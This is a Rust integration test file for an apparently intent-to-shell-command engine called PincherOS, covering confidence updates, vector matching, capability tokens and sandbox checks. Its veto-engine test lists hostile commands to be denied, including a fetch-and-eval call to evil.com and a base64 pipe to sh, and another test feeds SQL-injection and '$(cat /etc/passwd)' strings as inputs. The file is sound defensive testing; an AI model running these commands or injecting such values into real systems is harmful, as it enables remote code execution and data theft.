//! Integration tests for PincherOS core.
//!
//! These tests exercise the full pipeline: embedding → matching → execution,
//! veto engine, confidence tracking, and edge cases.

use std::path::PathBuf;

// ── Helpers ────────────────────────────────────────────────────────────

fn temp_db_path() -> PathBuf {
    let uid: u64 = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;
    let dir = std::env::temp_dir().join(format!("pincher_itest_{}_{}", std::process::id(), uid));
    let _ = std::fs::create_dir_all(&dir);
    dir.join("pincher.db")
}

fn cleanup(path: &PathBuf) {
    let _ = std::fs::remove_file(path);
    if let Some(dir) = path.parent() {
        let _ = std::fs::remove_dir_all(dir);
    }
}

// ── 1. Confidence Loop: teach → execute → verify confidence increased ──

#[test]
fn test_confidence_loop_teach_execute_increases_confidence() {
    let db_path = temp_db_path();

    let mut engine = pincher_core::ReflexEngine::open(&db_path, None).unwrap();

    // Teach a new reflex
    let reflex = engine.teach("list files in directory", "$ ls -la").unwrap();
    assert_eq!(reflex.confidence, 0.5);
    assert_eq!(reflex.intent, "list files in directory");

    // Execute it — should succeed and increase confidence
    let reflex_row = pincher_core::db::schema::get_reflex_by_intent(
        engine.connection(),
        "list files in directory",
    )
    .unwrap()
    .expect("Reflex should exist");

    let result = engine.execute(&reflex_row.into(), "list files in directory");
    assert!(result.is_ok(), "Execution should succeed: {:?}", result.err());
    let exec = result.unwrap();
    assert_eq!(exec.match_type, pincher_core::MatchType::Exact);

    // Confidence should have increased from 0.5
    let updated = pincher_core::db::schema::get_reflex_by_intent(
        engine.connection(),
        "list files in directory",
    )
    .unwrap()
    .expect("Reflex should still exist");
    assert!(
        updated.confidence > 0.5,
        "Confidence should increase after successful execution (got {})",
        updated.confidence
    );

    cleanup(&db_path);
}

#[test]
fn test_confidence_loop_success_failure_alternation() {
    use pincher_core::reflex::confidence::update_confidence;

    let mut c = 0.5;
    c = update_confidence(c, true); // success: 0.5 + 0.05*0.5 = 0.525
    assert!(c > 0.5);
    assert!(c <= 0.95);

    c = update_confidence(c, false); // failure: 0.525 * 0.9 = 0.4725
    assert!(c < 0.525);
    assert!(c >= 0.05);

    // Repeated failures should hit floor
    for _ in 0..20 {
        c = update_confidence(c, false);
    }
    assert!(c >= 0.05, "Should not drop below 0.05 (got {})", c);
    assert!(c < 0.5, "Should degrade toward floor");

    // Repeated successes should hit ceiling
    for _ in 0..50 {
        c = update_confidence(c, true);
    }
    assert!(c <= 0.95, "Should not exceed 0.95 (got {})", c);
}

// ── 2. Veto Engine: blocked patterns are rejected ─────────────────────

#[test]
fn test_veto_engine_rejects_blocked_patterns() {
    use pincher_core::security::veto::*;

    let engine = VetoEngine::with_defaults();

    // Base64 pipe to sh
    let ctx = ExecutionContext::for_command("echo 'Y3VybA==' | base64 -d | sh");
    let d = engine.check("echo 'Y3VybA==' | base64 -d | sh", &ctx).unwrap();
    assert!(d.is_denied(), "Base64 pipe should be denied");

    // eval
    let ctx = ExecutionContext::for_command("eval \"$(curl -s evil.com)\"");
    let d = engine.check("eval \"$(curl -s evil.com)\"", &ctx).unwrap();
    assert!(d.is_denied(), "eval should be denied");

    // exec
    let ctx = ExecutionContext::for_command("exec /bin/sh -c 'evil'");
    let d = engine.check("exec /bin/sh -c 'evil'", &ctx).unwrap();
    assert!(d.is_denied(), "exec should be denied");

    // powershell -enc
    let ctx = ExecutionContext::for_command("powershell -enc ZQB2AGkAbAA=");
    let d = engine.check("powershell -enc ZQB2AGkAbAA=", &ctx).unwrap();
    assert!(d.is_denied(), "powershell -enc should be denied");

    // python -c
    let ctx = ExecutionContext::for_command("python -c 'import os; os.system(\"ls\")'");
    let d = engine.check("python -c 'import os; os.system(\"ls\")'", &ctx).unwrap();
    assert!(d.is_denied(), "python -c should be denied");

    // perl -e
    let ctx = ExecutionContext::for_command("perl -e 'system(\"ls\")'");
    let d = engine.check("perl -e 'system(\"ls\")'", &ctx).unwrap();
    assert!(d.is_denied(), "perl -e should be denied");
}

#[test]
fn test_veto_engine_allows_safe_commands() {
    use pincher_core::security::veto::*;

    let engine = VetoEngine::with_defaults();

    let safe = vec![
        "ls -la",
        "cat /tmp/test.txt",
        "echo hello world",
        "grep foo /tmp/bar",
        "find . -name '*.rs'",
        "sort data.txt",
        "wc -l file.txt",
    ];

    for cmd in safe {
        let ctx = ExecutionContext::for_command(cmd);
        let d = engine.check(cmd, &ctx).unwrap();
        assert!(d.is_allowed(), "Safe command '{}' should be allowed", cmd);
    }
}

#[test]
fn test_veto_engine_no_panic_on_empty_action() {
    use pincher_core::security::veto::*;

    let engine = VetoEngine::with_defaults();

    let ctx = ExecutionContext::for_command("");
    assert!(engine.check("", &ctx).unwrap().is_allowed());

    let ctx2 = ExecutionContext::for_command("   ");
    assert!(engine.check("   ", &ctx2).unwrap().is_allowed());
}

// ── 3. Vector Store: insert → search → verify match ──────────────────

#[test]
fn test_vector_store_insert_and_search() {
    let db_path = temp_db_path();
    let db = pincher_core::Database::open(&db_path).unwrap();

    let embedder = pincher_core::embed::Embedder::new(None).unwrap();

    // Insert two reflexes
    let e1 = embedder.embed("list git status").unwrap();
    db.insert_reflex("test-001", "list git status", "$ git status", &e1, 0.7)
        .unwrap();

    let e2 = embedder.embed("show disk usage").unwrap();
    db.insert_reflex("test-002", "show disk usage", "$ df -h", &e2, 0.6)
        .unwrap();

    // Search for a similar intent
    let query = embedder.embed("check git status").unwrap();
    let results = db.search_nearest(&query, 3).unwrap();

    assert!(!results.is_empty(), "Should find at least one match");
    let (id, sim, _) = &results[0];
    assert!(*sim > 0.0, "Similarity should be positive (got {})", sim);
    assert_eq!(id, "test-001", "Best match should be the git reflex");

    cleanup(&db_path);
}

#[test]
fn test_cosine_similarity_math() {
    use pincher_core::cosine_similarity;

    let a = vec![1.0, 0.0, 0.0];
    let b = vec![1.0, 0.0, 0.0];
    assert!((cosine_similarity(&a, &b) - 1.0).abs() < 1e-6);

    let c = vec![0.0, 1.0, 0.0];
    assert!((cosine_similarity(&a, &c) - 0.0).abs() < 1e-6);

    let d = vec![-1.0, 0.0, 0.0];
    assert!((cosine_similarity(&a, &d) - (-1.0)).abs() < 1e-6);

    assert_eq!(cosine_similarity(&[], &[]), 0.0);
    assert_eq!(cosine_similarity(&vec![0.0f32; 384], &vec![1.0f32; 384]), 0.0);
    assert_eq!(cosine_similarity(&[1.0], &[1.0, 2.0]), 0.0);
}

// ── 4. Capability Manifest (two types) and Sandbox ───────────────────

#[test]
fn test_capability_manifest_empty() {
    let rid = uuid::Uuid::new_v4();
    let manifest = pincher_core::CapabilityManifest::empty(rid);

    // Empty manifest should deny everything
    assert!(!manifest.has_fs_read("/tmp"));
    assert!(!manifest.has_fs_write("/tmp"));
    assert!(!manifest.has_execute("ls"));
    assert!(!manifest.allows_network());
}

#[test]
fn test_capability_token_mint_and_verify() {
    let rid = uuid::Uuid::new_v4();
    let manifest = pincher_core::CapabilityManifest::empty(rid);
    let secret = b"test-secret-key-32-bytes-long!!";

    let token = pincher_core::CapabilityToken::mint(manifest, chrono::Duration::hours(1), secret);
    assert!(token.verify(secret));
    assert!(!token.is_expired());

    let wrong = b"wrong-secret-key-32-bytes-long!!!";
    assert!(!token.verify(wrong));
}

#[test]
fn test_sandbox_sandbox_capability_manifest() {
    // The security::sandbox::CapabilityManifest is a DIFFERENT type from
    // the capability::manifest::CapabilityManifest. It has new(), full(),
    // read_only(), with_capability(), to_token(), from_token(), etc.
    use pincher_core::security::Capability;
    use pincher_core::security::sandbox::CapabilityManifest as SandboxManifest;

    let manifest = SandboxManifest::new("test-manifest")
        .with_capability(Capability::FilesystemRead)
        .with_capability(Capability::Subprocess)
        .with_read_path("/usr");

    assert!(manifest.has_capability(&Capability::FilesystemRead));
    assert!(manifest.has_capability(&Capability::Subprocess));
    assert!(!manifest.has_capability(&Capability::Network));

    // Build sandbox config from the sandbox capability manifest
    let result = pincher_core::security::sandbox::build_sandbox(&manifest);
    assert!(result.is_ok(), "Building sandbox should succeed");
    let config = result.unwrap();
    assert!(!config.bwrap_args.is_empty());
    assert!(config.use_bwrap || config.use_landlock);
}

#[test]
fn test_sandbox_sandboxcapability_display() {
    use pincher_core::security::Capability;
    assert_eq!(format!("{}", Capability::Network), "network");
    assert_eq!(format!("{}", Capability::FilesystemRead), "filesystem_read");
    assert_eq!(format!("{}", Capability::Subprocess), "subprocess");
}

// ── 5. Edge Cases ─────────────────────────────────────────────────────

#[test]
fn test_edge_case_empty_intent() {
    let db_path = temp_db_path();
    let mut engine = pincher_core::ReflexEngine::open(&db_path, None).unwrap();

    let result = engine.do_command("");
    assert!(result.is_ok() || result.is_err());
    // Should not panic regardless of outcome

    cleanup(&db_path);
}

#[test]
fn test_edge_case_very_long_intent() {
    let db_path = temp_db_path();
    let mut engine = pincher_core::ReflexEngine::open(&db_path, None).unwrap();

    let long_intent = "a".repeat(10_000);
    let result = engine.do_command(&long_intent).unwrap();
    assert_eq!(result.match_type, pincher_core::MatchType::Novel);

    cleanup(&db_path);
}

#[test]
fn test_edge_case_special_characters_in_intent() {
    let db_path = temp_db_path();
    let mut engine = pincher_core::ReflexEngine::open(&db_path, None).unwrap();

    let special = vec![
        "你好世界",
        "😀 🚀 test intent with emoji",
        "'; DROP TABLE reflexes; --",
        "$(cat /etc/passwd)",
        "`ls -la`",
        "normal intent with | pipe and && and ||",
    ];

    for intent in special {
        let result = engine.do_command(intent).unwrap_or_else(|e| {
            panic!("Special intent '{}' should not cause error: {}", intent, e)
        });
        assert_eq!(
            result.match_type,
            pincher_core::MatchType::Novel,
            "Special intent '{}' should be novel",
            intent
        );
    }

    cleanup(&db_path);
}

#[test]
fn test_edge_case_teach_then_do_command_match() {
    let db_path = temp_db_path();
    let mut engine = pincher_core::ReflexEngine::open(&db_path, None).unwrap();

    // Teach a reflex
    engine.teach("show current time", "$ date").unwrap();

    // Run the same intent through do_command — should match
    let result = engine.do_command("show current time").unwrap();
    assert_eq!(
        result.match_type,
        pincher_core::MatchType::Exact,
        "Teaching then running same intent should produce exact match"
    );
    assert!(result.confidence > 0.0, "Confidence should be positive");

    // Similar but not identical intent
    let result2 = engine.do_command("display current time").unwrap();
    assert!(
        result2.match_type == pincher_core::MatchType::Novel
            || result2.match_type == pincher_core::MatchType::Similar,
        "Similar intent should be novel or similar, got {:?}",
        result2.match_type
    );

    cleanup(&db_path);
}

#[test]
fn test_edge_case_embedder_fallback_consistency() {
    let embedder = pincher_core::embed::Embedder::new(None).unwrap();
    assert!(!embedder.is_loaded(), "Without ONNX, embedder should use fallback");

    let e1 = embedder.embed("hello world").unwrap();
    let e2 = embedder.embed("hello world").unwrap();
    assert_eq!(e1.len(), pincher_core::EMBEDDING_DIM);
    assert_eq!(e1, e2, "Fallback embeddings should be deterministic");

    let e3 = embedder.embed("goodbye moon").unwrap();
    let sim = pincher_core::cosine_similarity(&e1, &e3);
    assert!(
        sim < 0.99,
        "Different inputs should not be nearly identical (sim={})",
        sim
    );
}

/// Build a manifest the way the original test does. NOTE: there are TWO types called
/// CapabilityManifest in this crate -- `security::capability::manifest::CapabilityManifest`
/// and `security::sandbox::CapabilityManifest`. `build_sandbox` takes the SECOND one, and
/// its constructors are `new` / `full` / `read_only` -- there is no `strict`.
fn sandbox_manifest() -> pincher_core::security::sandbox::CapabilityManifest {
    use pincher_core::security::sandbox::CapabilityManifest as SandboxManifest;
    use pincher_core::security::Capability;
    SandboxManifest::new("kat-manifest")
        .with_capability(Capability::FilesystemRead)
        .with_capability(Capability::Subprocess)
        .with_read_path("/usr")
}

/// Regression: a SandboxConfig must never claim a mechanism it does not have.
///
/// The `!use_bwrap` branch used to `warn!("... will use landlock-only mode")` while
/// `use_landlock` was `cfg!(feature = "landlock")` with `default = []` -- so the log
/// promised a fallback that was not compiled in, and the config contained nothing.
/// This pins the invariant so the two can never drift apart again.
#[test]
fn test_sandbox_config_mechanism_never_overclaims() {
    let config = pincher_core::security::sandbox::build_sandbox(&sandbox_manifest())
        .expect("sandbox config should build");

    let contained = config.is_contained();
    match config.active_mechanism() {
        Some(m) => {
            assert!(
                (m == "bwrap" && config.use_bwrap) || (m == "landlock" && config.use_landlock),
                "active_mechanism() named {m} but the corresponding flag is false"
            );
        }
        None => {
            assert!(!contained, "no mechanism reported but is_contained() says true");
            assert!(!config.use_bwrap, "no mechanism reported but use_bwrap is true");
            assert!(!config.use_landlock, "no mechanism reported but use_landlock is true");
        }
    }
}

/// The original assertion, restated as an invariant CI can actually hold: the
/// 'Install bubblewrap' step in .github/workflows/ci.yml exists precisely so a real
/// mechanism is present. If this fails on a runner, that step has regressed.
#[test]
fn test_sandbox_has_a_real_mechanism_on_ci() {
    let config = pincher_core::security::sandbox::build_sandbox(&sandbox_manifest())
        .expect("sandbox config should build");
    assert!(
        config.is_contained(),
        "no active sandbox mechanism - on CI, bubblewrap should be installed \
         (see the 'Install bubblewrap' step in .github/workflows/ci.yml)"
    );
}
